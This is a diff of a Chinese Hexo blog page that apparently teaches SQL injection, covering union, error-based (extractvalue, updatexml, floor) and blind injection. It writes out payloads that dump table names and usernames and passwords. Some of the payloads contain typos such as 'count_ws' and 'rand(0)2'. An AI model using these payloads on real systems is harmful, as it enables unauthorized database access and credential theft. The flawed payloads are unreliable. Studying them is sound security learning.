@@ -10,20 +10,20 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="分类  按字段查询：数字型注入和字符型注入  按注入方式：union联合注入、报错注入、布尔盲注、时间注入">
+  <meta name="description" content="分类 按字段查询：数字型注入和字符型注入  按注入方式：union联合注入、报错注入、布尔盲注、时间注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入">
 <meta property="og:url" content="https://zhouypeng.github.io/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="zhou">
-<meta property="og:description" content="分类  按字段查询：数字型注入和字符型注入  按注入方式：union联合注入、报错注入、布尔盲注、时间注入">
+<meta property="og:description" content="分类 按字段查询：数字型注入和字符型注入  按注入方式：union联合注入、报错注入、布尔盲注、时间注入">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zhouypeng.github.io/SQL%E6%B3%A8%E5%85%A5/1.png">
+<meta property="og:image" content="https://zhouypeng.github.io/sql%E6%B3%A8%E5%85%A5/1.png">
 <meta property="article:published_time" content="2024-04-01T02:43:11.000Z">
-<meta property="article:modified_time" content="2024-04-10T03:22:35.212Z">
+<meta property="article:modified_time" content="2024-05-30T13:09:30.853Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zhouypeng.github.io/SQL%E6%B3%A8%E5%85%A5/1.png">
+<meta name="twitter:image" content="https://zhouypeng.github.io/sql%E6%B3%A8%E5%85%A5/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -103,7 +103,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 18
+    			总文章数 19
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -294,15 +294,13 @@
  
 
 	
-		<p><strong>分类</strong></p>
-<ul>
+		<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a><strong>分类</strong></h4><ul>
 <li><p><strong>按字段查询</strong>：数字型注入和字符型注入</p>
 </li>
 <li><p><strong>按注入方式</strong>：union联合注入、报错注入、布尔盲注、时间注入</p>
 <span id="more"></span></li>
 </ul>
-<p>判断字符型和数字型</p>
-<p>使用and 1&#x3D;1和and 1&#x3D;2来判断，如果都回显成功则是字符型，后者报错就是数字型</p>
+<h4 id="判断字符型和数字型"><a href="#判断字符型和数字型" class="headerlink" title="判断字符型和数字型"></a>判断字符型和数字型</h4><p>使用and 1&#x3D;1和and 1&#x3D;2来判断，如果都回显成功则是字符型，后者报错就是数字型</p>
 <p>union联合注入(union select)</p>
 <p><strong>group_concat</strong>：确保所有查询信息能放到一行显示</p>
 <p><strong>information_schema</strong></p>
@@ -310,52 +308,40 @@
 <li>tables：所有表集合</li>
 <li>columns：所有列集合</li>
 </ul>
-<p><strong>查字段列数</strong></p>
-<ul>
+<h4 id="查字段列数"><a href="#查字段列数" class="headerlink" title="查字段列数"></a><strong>查字段列数</strong></h4><ul>
 <li>group by</li>
 <li>order by</li>
 </ul>
-<p><strong>查回显位</strong></p>
-<ul>
+<h4 id="查回显位"><a href="#查回显位" class="headerlink" title="查回显位"></a><strong>查回显位</strong></h4><ul>
 <li>例如如果有三列，… union select 1,2,3</li>
 <li>如果只回显第一行，可以让前面是-1或者后面加limit 1,1表示读取第一列开始的一个数</li>
 </ul>
-<p><strong>查数据库</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 0&#x27; union select 1, 2, database()</span><br></pre></td></tr></table></figure>
+<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a><strong>查数据库</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 0&#x27; union select 1, 2, database()</span><br></pre></td></tr></table></figure>
 
-<p><strong>查数据表</strong></p>
-<p>数据库Infomation_schema–&gt;数据表tables–&gt;数据列table_name</p>
+<h4 id="查数据表"><a href="#查数据表" class="headerlink" title="查数据表"></a><strong>查数据表</strong></h4><p>数据库Infomation_schema–&gt;数据表tables–&gt;数据列table_name</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
 
-<p><strong>查数据名</strong></p>
-<p>数据库Infomation_schema–&gt;数据表columns–&gt;数据列column_name</p>
+<h4 id="查数据名"><a href="#查数据名" class="headerlink" title="查数据名"></a><strong>查数据名</strong></h4><p>数据库Infomation_schema–&gt;数据表columns–&gt;数据列column_name</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;…..&quot;--+</span><br></pre></td></tr></table></figure>
 
-<p><strong>查询最终目标</strong></p>
-<p>select列名+from表名+where限定语句</p>
+<h4 id="查询最终目标"><a href="#查询最终目标" class="headerlink" title="查询最终目标"></a><strong>查询最终目标</strong></h4><p>select列名+from表名+where限定语句</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&#x27; union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure>
 
-<p>报错注入</p>
-<p>输入正确语句时不检查语句，回显同一个内容，输入错误语句时，正常报错</p>
-<p><strong>extractvalue()报错注入</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(列名，查询内容)</span><br><span class="line"></span><br><span class="line">报错库名：?id=100&#x27; union select extractvalue(1,concat(0x7e,(select database()))) --+</span><br><span class="line"></span><br><span class="line">报错表名：?id=100&#x27; union select extractvalue(1,concat(0x7e,(group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</span><br><span class="line"></span><br><span class="line">报错列名和内容同理</span><br><span class="line"></span><br><span class="line">回显的内容只有32位这时需要使用substring()，?id=100&#x27; union select extractvalue(1,concat(0x7e,(select substring(group_concat(username,password),25,30) from user))) --+</span><br></pre></td></tr></table></figure>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>输入正确语句时不检查语句，回显同一个内容，输入错误语句时，正常报错</p>
+<h5 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a><strong>extractvalue()报错注入</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(列名，查询内容)</span><br><span class="line"></span><br><span class="line">报错库名：?id=100&#x27; union select extractvalue(1,concat(0x7e,(select database()))) --+</span><br><span class="line"></span><br><span class="line">报错表名：?id=100&#x27; union select extractvalue(1,concat(0x7e,(group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</span><br><span class="line"></span><br><span class="line">报错列名和内容同理</span><br><span class="line"></span><br><span class="line">回显的内容只有32位这时需要使用substring()，?id=100&#x27; union select extractvalue(1,concat(0x7e,(select substring(group_concat(username,password),25,30) from user))) --+</span><br></pre></td></tr></table></figure>
 
-<p><strong>updateXml()报错注入</strong></p>
-<ul>
+<h5 id="updateXml-报错注入"><a href="#updateXml-报错注入" class="headerlink" title="updateXml()报错注入"></a><strong>updateXml()报错注入</strong></h5><ul>
 <li>updatexml(名，查询内容，数据)</li>
 <li>跟extractvalue一样，只是多了数据，也给定义为1</li>
 </ul>
-<p><strong>floor()报错注入</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rand()函数：随机返回0~1间的小数</span><br><span class="line"></span><br><span class="line">floor()函数：小数向下取整</span><br><span class="line"></span><br><span class="line">concat_ws()函数：将括号内数据用第一个字段连接起来</span><br><span class="line"></span><br><span class="line">如：concat_ws(&quot;~&quot;,1,2)--&gt;1~2</span><br><span class="line"></span><br><span class="line">as别名，group by分组</span><br><span class="line"></span><br><span class="line">count()函数：汇总统计数量</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,count(),count_ws(&quot;~&quot;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)2)) as a from information_schema.table group by a--+</span><br><span class="line"></span><br><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=database())这部分进行改动查询报错</span><br></pre></td></tr></table></figure>
+<h5 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a><strong>floor()报错注入</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rand()函数：随机返回0~1间的小数</span><br><span class="line"></span><br><span class="line">floor()函数：小数向下取整</span><br><span class="line"></span><br><span class="line">concat_ws()函数：将括号内数据用第一个字段连接起来</span><br><span class="line"></span><br><span class="line">如：concat_ws(&quot;~&quot;,1,2)--&gt;1~2</span><br><span class="line"></span><br><span class="line">as别名，group by分组</span><br><span class="line"></span><br><span class="line">count()函数：汇总统计数量</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,count(),count_ws(&quot;~&quot;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)2)) as a from information_schema.table group by a--+</span><br><span class="line"></span><br><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=database())这部分进行改动查询报错</span><br></pre></td></tr></table></figure>
 
-<p><strong>布尔盲注</strong>  </p>
-<ul>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><ul>
 <li>substring()函数</li>
 <li>ascil(substring(select database(),1,1))&gt;97</li>
 </ul>
-<p><img src="/./SQL%E6%B3%A8%E5%85%A5/1.png"></p>
-<p><strong>时间盲注</strong></p>
-
+<p><img src="/sql%E6%B3%A8%E5%85%A5/1.png"></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h4>
 	
 
 
